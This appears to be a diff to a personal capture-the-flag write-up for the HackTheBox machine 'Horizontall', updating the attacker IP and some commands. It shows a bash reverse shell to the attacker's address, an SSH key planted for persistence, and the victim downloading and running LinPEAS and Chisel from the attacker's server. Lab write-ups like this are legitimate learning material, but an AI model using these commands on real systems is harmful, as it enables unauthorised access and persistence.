@@ -103,7 +103,7 @@ You can also execute RCE as well -- `sleep 20` seems to sleep, which is fantasti
 Let's try to start a reverse shell.
 
     Note: These may change. Run `ip a` to see your IP.
-    Attacker IP:    10.10.14.64
+    Attacker IP:    10.10.14.40
     Victim IP:      10.10.11.105
 
 Attacker (listens for connections):
@@ -112,7 +112,7 @@ Attacker (listens for connections):
 
 Victim (init TCP connection to attacker):
 
-    bash -c 'bash -i >& /dev/tcp/10.10.14.64/6969 0>&1'
+    bash -c 'bash -i >& /dev/tcp/10.10.14.40/6969 0>&1'
 
 And it works! We have shell.
 
@@ -120,7 +120,7 @@ And it works! We have shell.
 ┌─[vagrant@parrot]─[~]
 └──╼ $nc -lvp 6969
 listening on [any] 6969 ...
-connect to [10.10.14.64] from horizontall.htb [10.10.11.105] 37142
+connect to [10.10.14.40] from horizontall.htb [10.10.11.105] 37142
 bash: cannot set terminal process group (1897): Inappropriate ioctl for device
 bash: no job control in this shell
 strapi@horizontall:~/myapi$ whoami
@@ -157,11 +157,12 @@ Because I am extremely lazy, and have basically no idea how to proceed, I'm goin
 
 So, apparently you can put the attacker's public key inside `/opt/strapi/.ssh/authorized_keys` to get a better shell. Because reverse shells often lack nice tty features.
 
-    echo "ssh-rsa whatever" >> /opt/strapi/.ssh/authorized_keys
+    mkdir -p /opt/strapi/.ssh/
+    echo "ssh-rsa whateverasdfasdf, go look in attacker's id_rsa.pub file" >> /opt/strapi/.ssh/authorized_keys
 
 Attacker can now run:
 
-    ssh strapi@horizontall.htb /bin/bash
+    ssh strapi@horizontall.htb
 
 The writeup recommends [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)...
 
@@ -180,7 +181,7 @@ Attacker (build then host linpeas script):
 
 Victim (dl and exec linpeas):
 
-    wget 10.10.14.64:8000/linpeas.sh 
+    wget 10.10.14.40:8000/linpeas.sh 
     chmod +x linpeas.sh
     ./linpeas.sh -h
 
@@ -199,6 +200,7 @@ So, the first step is to port forward using a tool called "Chisel".
 ###### Get Chisel binary into victim
 
 On attacker:
+
     pushd /tmp/
     if [[ ! -f chisel_1.7.6_linux_386 ]]; then
         wget "https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_386.gz"
@@ -207,7 +209,7 @@ On attacker:
     updog -d ./
 
 On victim:
-    wget 10.10.14.64:9090/chisel_1.7.6_linux_386
+    wget 10.10.14.40:9090/chisel_1.7.6_linux_386
     mv chisel_1.7.6_linux_386 chisel
     chmod +x chisel
     ls
